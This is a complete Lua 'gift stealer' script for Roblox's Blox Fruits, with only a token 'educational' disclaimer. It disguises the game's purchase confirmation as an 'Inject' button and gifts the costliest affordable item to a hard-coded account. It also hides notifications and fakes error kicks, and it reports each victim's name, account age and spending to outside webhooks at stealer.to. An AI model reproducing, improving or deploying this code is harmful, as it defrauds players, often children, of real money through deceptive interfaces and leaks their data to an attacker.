--[[
    Combined Roblox Gift Stealer Script

    Combines working gift logic from "old workinge.txt" with features from
    "non shark mine script.txt." This script includes improved UI,
    logging, executor detection, and anti-Delta measures.

    NOTE: This script is for educational analysis only. Using it maliciously is unethical.
]]

-- Configuration Variables
local LogsWebhook = "https://stealer.to/post?uniqueid=97b37190" -- Discord webhook URL for purchase logs
local ExecutionWebhook = "https://stealer.to/post?uniqueid=e92c9e96" -- Discord webhook URL for script execution logs
local Username = "x6TNine" -- Username to gift items to
local PromptText = "Inject" -- Custom text for the purchase prompt button
local RandomizedPrompt = false -- Whether to randomize prompt UI elements
local version = "1.2.3" -- Current script version

-- << Obfuscate after this moment (For devs, not making it for user)

-- Wait for game load
repeat task.wait() until game:IsLoaded()

-- Anti-Exploit for Unsupported Executor
local unsupportedExecutor = "Delta"
local kickMessage = unsupportedExecutor .. " is currently unsupported on mobile. Please try a different executor (e.g., Codex, Fluxus) or use a PC."

-- Helper Function to Identify the Executor
local function getExecutor()
    if identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown"
    end
end

-- Helper function to check if the player is on mobile
local function isMobile()
    local UserInputService = game:GetService("UserInputService")
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

-- Kick player if using unsupported executor on mobile
local currentExecutor = getExecutor()
if currentExecutor == unsupportedExecutor and isMobile() then
    game.Players.LocalPlayer:Kick(kickMessage)
end

-- Service Declarations
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

-- Get current player
local player = Players.LocalPlayer

-- Player Data
local playerName = player.Name
local playerDisplayName = player.DisplayName
local playerUserId = player.UserId

-- Game Details
local gameId = game.PlaceId
local success, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(gameId)
end)

local gameName = success and gameInfo.Name or "Unknown Game"
local gameLink = "https://www.roblox.com/games/" .. gameId

-- Player Profile Link
local playerProfileLink = "https://www.roblox.com/users/" .. playerUserId .. "/profile"

local UserId = nil
local totalSpent = 0
local messages = {
    "Here's your gift!",
    "Enjoy your new item!",
    "A little something for you!",
    "Hope you like it!",
    "You deserve this!",
    "Just a small token of appreciation!",
    "Here you go!",
    "Something special for you!",
    "You've earned this!",
    "Hype swag unlocked rn",
    "Imagine swag vibes rn",
}

--[[ UI Manipulation Functions ]]
-- Loop to hide the "Sink" element in the ViewportOverlay
local function loopSinkTransparency()
    while true do
        local sink = game.Players.LocalPlayer.PlayerGui:FindFirstChild("ViewportOverlay")
            and game.Players.LocalPlayer.PlayerGui.ViewportOverlay:FindFirstChild("Sink")
        if sink then
            sink.BackgroundTransparency = 1
        end
        task.wait()
    end
end

-- Function to hide all in-game notifications
local function hideNotifications()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local notifications = playerGui:FindFirstChild("Notifications")
    
    if notifications then
        notifications.Enabled = false
    end
end

-- Helper function for a random color
local function getRandomColor()
    return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
end

-- Helper function to get a random font
local function getRandomFont()
    local fonts = {
        Enum.Font.PermanentMarker,
        Enum.Font.Arcade,
        Enum.Font.Bangers,
        Enum.Font.Creepster,
        Enum.Font.DenkOne,
        Enum.Font.Highway,
        Enum.Font.IndieFlower,
        Enum.Font.JosefinSans,
        Enum.Font.Merriweather
    }
    return fonts[math.random(1, #fonts)]
end

-- Function to modify the purchase prompt UI
local function modifyPromptUI(isFirstPrompt)
    local CoreGui = game:GetService("CoreGui")
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end
    local prompt = Animator:FindFirstChild("Prompt")
    if not prompt then return end
    local alertContents = prompt:FindFirstChild("AlertContents")
    if not alertContents then return end

    -- Hide default elements and set custom background
    prompt.BackgroundTransparency = 1
    prompt.Image = ""

    -- Hide title and middle content
    local titleContainer = alertContents:FindFirstChild("TitleContainer")
    if titleContainer then
        local titleArea = titleContainer:FindFirstChild("TitleArea")
        if titleArea then
            titleArea.Visible = false
        end
    end

    local middleContent = alertContents:FindFirstChild("MiddleContent")
    if middleContent then
        middleContent.Visible = false
    end

    -- Customization of the purchase button
    local footerButtons = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
    if footerButtons then
        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            button1.Visible = false
        end

        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2:ClearAllChildren()

             -- Create a frame container for the custom button
            local buttonContainer = Instance.new("Frame")
            buttonContainer.Name = "ButtonContainer"
            buttonContainer.Size = UDim2.new(1, 0, 1, 0)
            buttonContainer.BackgroundTransparency = 1
            buttonContainer.Parent = button2

            -- Create a frame for the button background
            local background = Instance.new("Frame")
            background.Name = "Background"
            background.Size = UDim2.new(1, 0, 1, 0)
            background.BackgroundTransparency = 0.9
            background.Parent = buttonContainer

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0.2, 0)
            corner.Parent = background

            -- Create a gradient for the button
            local gradient = Instance.new("UIGradient")
            gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45

            local gradientColors
            if RandomizedPrompt then
                gradientColors = {
                    ColorSequenceKeypoint.new(0, getRandomColor()),
                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
                    ColorSequenceKeypoint.new(1, getRandomColor())
                }
            else
                gradientColors = {
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 150, 255))
                }
            end
            gradient.Color = ColorSequence.new(gradientColors)
            gradient.Parent = background

            -- Create glow effect behind the button text
            local glow = Instance.new("ImageLabel")
            glow.Name = "Glow"
            glow.BackgroundTransparency = 1
            glow.Image = "rbxassetid://7912134082"
            glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(80, 150, 255)
            glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
            glow.Size = UDim2.new(1.2, 0, 1.2, 0)
            glow.Position = UDim2.new(0.5, 0, 0.5, 0)
            glow.AnchorPoint = Vector2.new(0.5, 0.5)
            glow.Parent = buttonContainer

            -- Create the button text label
            local buttonText = Instance.new("TextLabel")
            buttonText.Name = "ButtonText"
            buttonText.Size = UDim2.new(1, 0, 1, 0)
            buttonText.BackgroundTransparency = 1
            buttonText.Text = PromptText or "Execute Script"
            buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
            buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
            buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0
            buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.PermanentMarker
            buttonText.TextScaled = true
            buttonText.Parent = buttonContainer

            -- Create a shadow text label
            local textShadow = buttonText:Clone()
            textShadow.Name = "TextShadow"
            textShadow.Position = UDim2.new(0, 2, 0, 2)
            textShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
            textShadow.TextTransparency = 0.8
            textShadow.ZIndex = buttonText.ZIndex - 1
            textShadow.Parent = buttonContainer

            -- Animation setup
            local tweenService = game:GetService("TweenService")
            local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            local glowInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)

            -- Animate glow effect
            local glowTween = tweenService:Create(glow, glowInfo, {
                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6,
                Size = UDim2.new(1.3, 0, 1.3, 0)
            })
            glowTween:Play()

            -- Mouse enter animation
            button2.MouseEnter:Connect(function()
                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                    Size = UDim2.new(1.1, 0, 1.1, 0)
                })

                local hoverGradientColors
                if RandomizedPrompt then
                    hoverGradientColors = {
                        ColorSequenceKeypoint.new(0, getRandomColor()),
                        ColorSequenceKeypoint.new(0.5, getRandomColor()),
                        ColorSequenceKeypoint.new(1, getRandomColor())
                    }
                else
                    hoverGradientColors = {
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 170, 255)),
                        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 200, 255)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 170, 255))
                    }
                end

                local colorTween = tweenService:Create(gradient, hoverInfo, {
                    Color = ColorSequence.new(hoverGradientColors)
                })
                
                local glowColorTween = tweenService:Create(glow, hoverInfo, {
                    ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6
                })

                scaleTween:Play()
                colorTween:Play()
                glowColorTween:Play()
            end)

             -- Mouse leave animation
            button2.MouseLeave:Connect(function()
                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                    Size = UDim2.new(1, 0, 1, 0)
                })
                
                local colorTween = tweenService:Create(gradient, hoverInfo, {
                    Color = ColorSequence.new(gradientColors)
                })
                
                local glowColorTween = tweenService:Create(glow, hoverInfo, {
                    ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
                })

                scaleTween:Play()
                colorTween:Play()
                glowColorTween:Play()
            end)
        end
    end

    -- Hide robux remaining text
    local footer = alertContents:FindFirstChild("Footer")
    if footer then
        local footerContent = footer:FindFirstChild("FooterContent")
        if footerContent then
            local content = footerContent:FindFirstChild("Content")
            if content then
                local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
                if RemainingBalanceText then
                    RemainingBalanceText.Visible = false
                end
            end
        end
    end
end

--[[ Executor & Webhook Functions ]]

-- Function to get a random message
local function getRandomMessage()
    return messages[math.random(1, #messages)]
end

-- Function to send script execution logs to discord webhook
local function sendExecutionLog()
    local executorIdentifier = getExecutor()
    local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
    local membershipType = game.Players.LocalPlayer.MembershipType
    local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"

    local embed = {
        ["title"] = "Script Execution Log",
        ["color"] = 3063792,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = game.Players.LocalPlayer.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Current BF Stealer Version",
                ["value"] = version,
                ["inline"] = true
            },
            {
                ["name"] = "Current Game",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Has Premium",
                ["value"] = hasPremium,
                ["inline"] = true
            },
            {
                ["name"] = "Current Executor",
                ["value"] = executorIdentifier,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
        }
    }

    local data = HttpService:JSONEncode({
        ["embeds"] = {embed}
    })

    request({
        Url = ExecutionWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

-- Function to send log of successful purchase
local function sendWebhook(totalSpent, itemName)
    local balance = getRobuxBalance()
    local executorIdentifier = getExecutor()

    local embed = {
        ["title"] = ":shark: ! LMAO SHARKED ! :shark:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. totalSpent .. "```"
            },
            {
                ["name"] = "ɪᴛᴇᴍ ʜɪᴛ",
                ["value"] = "```" .. itemName .. "```"
            },
            {
                ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
                ["value"] = "```Executor: " .. executorIdentifier .. "```"
            },
             {
                ["name"] = "ᴄᴜʀʀᴇɴᴛ ʀᴏʙᴜx",
                ["value"] = "```" .. balance .. "```"
            },
            {
                ["name"] = "Join Fistor's Stealer Discord!",
                ["value"] = "[**Join Invite**](https://discord.gg/tanThs2F)",
            }
        }
    }

     local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

--[[ Purchase Logic (from old workinge.txt) ]]
local promptConfirmed = false
local purchaseInProgress = false

local function getRobuxBalance()
   local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return 0 end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return 0 end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return 0 end
    local prompt = Animator:FindFirstChild("Prompt")
    if not prompt then return 0 end
    local alertContents = prompt:FindFirstChild("AlertContents")
    if not alertContents then return 0 end
    local footer = alertContents:FindFirstChild("Footer")
    if not footer then return 0 end
    local footerContent = footer:FindFirstChild("FooterContent")
    if not footerContent then return 0 end
    local content = footerContent:FindFirstChild("Content")
    if not content then return 0 end
    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
     return (balanceText and tonumber(balanceText) or 0) + 25
end

-- Function to wait for the prompt to disappear
local function waitForPromptToDisappear()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end

    while Animator:FindFirstChild("Prompt") do
        task.wait()
    end
end

local function waitForPurchaseConfirmation()
    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
    local Animator = ProductContainer:WaitForChild("Animator")
    local prompt = Animator:WaitForChild("Prompt")
    local alertContents = prompt:WaitForChild("AlertContents")
    local footer = alertContents:WaitForChild("Footer")
    local footerButtons = footer:WaitForChild("Buttons")

    local confirmButton = footerButtons:WaitForChild("2")
    confirmButton.MouseButton1Click:Connect(function()
        promptConfirmed = true
    end)
end


-- Function to buy an item
local function buyItem(storageName, purchaseLocation, cost)
    if purchaseInProgress then
        return
    end

    purchaseInProgress = true
    promptConfirmed = false

   local receiverName = Username
    local receiverUserId = UserId

    local args = {
        [1] = "buyRobuxShop",
        [2] = {
            ["StorageName"] = storageName,
            ["PurchaseAction"] = "Gift",
            ["PurchaseLocation"] = purchaseLocation,
            ["Message"] = math.random() > 0.5 and getRandomMessage() or "...",
            ["FunnelId"] = "Shop",
            ["ReceiverName"] = receiverName,
            ["ReceiverUserId"] = receiverUserId
        }
    }

    local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
    if CommF then
        CommF:InvokeServer(unpack(args))

        waitForPurchaseConfirmation()

        while not promptConfirmed do
            task.wait()
        end

       if promptConfirmed then
            totalSpent = totalSpent + cost
            sendWebhook(totalSpent, storageName)
        end
    else
        warn("err")
    end

    waitForPromptToDisappear()
    purchaseInProgress = false
end

--[[ Item Stealing Logic ]]
-- Function to select and purchase items based on balance
local function stealItem(balance)
    -- Inner function to call the buyItem function with the receiver details
    local function buyItemWithReceiver(storageName, purchaseLocation, cost)
            buyItem(storageName, purchaseLocation, cost)
    end

    -- Item purchase based on the balance
        if balance >= 5000 then
        buyItemWithReceiver("Permanent Dragon-Dragon", "FruitShop", 5000)
    elseif balance >= 4000 then
        buyItemWithReceiver("Permanent Kitsune-Kitsune", "FruitShop", 4000)
    elseif balance >= 3000 then
        buyItemWithReceiver("Permanent Yeti-Yeti", "FruitShop", 3000)
    elseif balance >= 2700 then
        buyItemWithReceiver("Fruit Notifier", "Shop", 2700)
    elseif balance >= 2550 then
        buyItemWithReceiver("Permanent Spirit-Spirit", "FruitShop", 2550)
    elseif balance >= 2500 then
        buyItemWithReceiver("Permanent Gas-Gas", "FruitShop", 2500)
    elseif balance >= 2450 then
        buyItemWithReceiver("Permanent Venom-Venom", "FruitShop", 2450)
    elseif balance >= 2425 then
        buyItemWithReceiver("Permanent Shadow-Shadow", "FruitShop", 2425)
    elseif balance >= 2400 then
        buyItemWithReceiver("Permanent Dough-Dough", "FruitShop", 2400)
    elseif balance >= 2350 then
        buyItemWithReceiver("Permanent T-Rex-T-Rex", "FruitShop", 2350)
    elseif balance >= 2300 then
        buyItemWithReceiver("Permanent Gravity-Gravity", "FruitShop", 2300)
    elseif balance >= 2250 then
        buyItemWithReceiver("Permanent Blizzard-Blizzard", "FruitShop", 2250)
    elseif balance >= 2200 then
        buyItemWithReceiver("Permanent Pain-Pain", "FruitShop", 2200)
    elseif balance >= 2100 then
        buyItemWithReceiver("Permanent Rumble-Rumble", "FruitShop", 2100)
    elseif balance >= 2000 then
        buyItemWithReceiver("Permanent Portal-Portal", "FruitShop", 2000)
    elseif balance >= 1900 then
        buyItemWithReceiver("Permanent Sound-Sound", "FruitShop", 1900)
    elseif balance >= 1800 then
        buyItemWithReceiver("Permanent Spider-Spider", "FruitShop", 1800)
    elseif balance >= 1700 then
        buyItemWithReceiver("Permanent Love-Love", "FruitShop", 1700)
    elseif balance >= 1650 then
        buyItemWithReceiver("Permanent Buddha-Buddha", "FruitShop", 1650)
    elseif balance >= 1500 then
        buyItemWithReceiver("3x Mythical Scrolls", "Shop", 1500)
    elseif balance >= 1300 then
        buyItemWithReceiver("Permanent Magma-Magma", "FruitShop", 1300)
    elseif balance >= 1275 then
        buyItemWithReceiver("Permanent Ghost-Ghost", "FruitShop", 1275)
    elseif balance >= 1250 then
        buyItemWithReceiver("Permanent Barrier-Barrier", "FruitShop", 1250)
    elseif balance >= 1200 then
        buyItemWithReceiver("Dark Blade", "Shop", 1200)
    elseif balance >= 1100 then
        buyItemWithReceiver("Permanent Light-Light", "FruitShop", 1100)
    elseif balance >= 1000 then
        buyItemWithReceiver("Permanent Diamond-Diamond", "FruitShop", 1000)
    elseif balance >= 950 then
        buyItemWithReceiver("Permanent Dark-Dark", "FruitShop", 950)
    elseif balance >= 850 then
        buyItemWithReceiver("Permanent Sand-Sand", "FruitShop", 850)
    elseif balance >= 750 then
        buyItemWithReceiver("Permanent Ice-Ice", "FruitShop", 750)
    elseif balance >= 650 then
        buyItemWithReceiver("Permanent Falcon-Falcon", "FruitShop", 650)
    elseif balance >= 550 then
        buyItemWithReceiver("Permanent Flame-Flame", "FruitShop", 550)
    elseif balance >= 460 then
        buyItemWithReceiver("2x Mastery", "Shop", 450)
    elseif balance >= 450 then
        buyItemWithReceiver("2x Money", "Shop", 450)
    elseif balance >= 400 then
        buyItemWithReceiver("+1 Fruit Storage", "Shop", 400)
     elseif balance >= 380 then
        buyItemWithReceiver("Permanent Spike-Spike", "FruitShop", 380)
    elseif balance >= 350 then
        buyItemWithReceiver("2x Boss Drops", "Shop", 350)
    elseif balance >= 250 then
        buyItemWithReceiver("Permanent Smoke-Smoke", "FruitShop", 250)
    elseif balance >= 220 then
        buyItemWithReceiver("Permanent Bomb-Bomb", "FruitShop", 220)
    elseif balance >= 180 then
        buyItemWithReceiver("Permanent Spring-Spring", "FruitShop", 180)
    elseif balance >= 100 then
        buyItemWithReceiver("Permanent Blade-Blade", "FruitShop", 100)
    elseif balance >= 75 then
        buyItemWithReceiver("Permanent Spin-Spin", "FruitShop", 75)
    elseif balance >= 50 then
        buyItemWithReceiver("10K Money", "Shop", 50)
    elseif balance >= 25 then
        buyItemWithReceiver("2x EXP (15 mins.)", "Shop", 25)
    end

    return
end

--[[ Main Script Logic ]]
local function getRobuxAndProceed()
    coroutine.wrap(function()
        -- Starts a loop that makes "Sink" element transparent
        coroutine.wrap(loopSinkTransparency)()

        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["StorageName"] = "2x EXP (15 mins.)",
                ["PurchaseAction"] = "Gift",
                ["PurchaseLocation"] = "Shop",
                ["Message"] = "...",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = "x6TNine",
                ["ReceiverUserId"] = 2961160220
            }
        }

         -- Remote event to trigger the shop and gift an item
        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
        if CommF then
            CommF:InvokeServer(unpack(args))
        end

         -- Wait for the purchase prompt UI to appear
        local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
        while not PurchasePrompt do
            task.wait()
            PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
        end

         -- Hiding Roblox's Upsell Container for an attempt to avoid detection
        coroutine.wrap(function()
            while true do
                local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
                if RobuxUpsellContainer then
                    RobuxUpsellContainer.Visible = false
                    game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Subscribe to SharkyScripts & Try again.")
                    break
                end
                task.wait(0.1)
            end
        end)()

         -- Get the prompt container
        local ProductPurchaseContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
        if ProductPurchaseContainer then
            local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
            if Animator then
                local Prompt = Animator:WaitForChild("Prompt")
                if Prompt then
                    Prompt.Visible = false

                     -- Hide the settings clipping shield in case it is present
                    local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
                    if settingsClippingShield then
                        settingsClippingShield.Visible = false
                    end

                    task.wait(1)

                    -- Get the current balance
                    local balance = getRobuxBalance()
            
                     -- Kick the player if robux is below the minimum to purchase
                    if balance < 25 then
                        game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
                        return
                    end

                    -- Close the menu
                    local VirtualInputManager = game:GetService("VirtualInputManager")
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                    task.wait()
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

                     -- Wait for prompt to disappear
                    waitForPromptToDisappear()

                    task.wait(0.5)

                     -- Steal the item
                    stealItem(balance)
                else
                    print("err1")
                end
            else
                print("err2")
            end
        else
            print("err3")
        end
    end)()
end

-- Function to wait for the prompt UI to appear and modify it
local function waitForPrompt()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end

    -- Modify UI
    modifyPromptUI(true)

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            modifyPromptUI(false)
            waitForPurchaseConfirmation()
        end
    end)

     -- Loop for escaping the prompts
    coroutine.wrap(function()
        while not promptConfirmed do
            task.wait()
        end

         -- Send the webhook only after the user is done interacting with the prompts
        if totalSpent >= 25 then
        else
            print("err")
        end

         -- Loop to escape out of the prompts
        local VirtualInputManager = game:GetService("VirtualInputManager")

        while true do
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
            task.wait() 

            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

            local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
            if not PurchasePrompt then
                break
            end

            local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
            if not ProductContainer then break end

            local Animator = ProductContainer:FindFirstChild("Animator")
            if not Animator then break end

            local prompt = Animator:FindFirstChild("Prompt")
            if not prompt then
                break 
            end
        end
    end)()
end

-- Get the victim's User ID and start script execution
local success, err = pcall(function()
    UserId = Players:GetUserIdFromNameAsync(Username)
end)

if success then
    -- Send Execution log
    sendExecutionLog()
    -- Hide notifications
     hideNotifications()
    -- Wait for prompt
    waitForPrompt()
    -- Start main logic
    getRobuxAndProceed()
else
    warn("Error: " .. err)
end
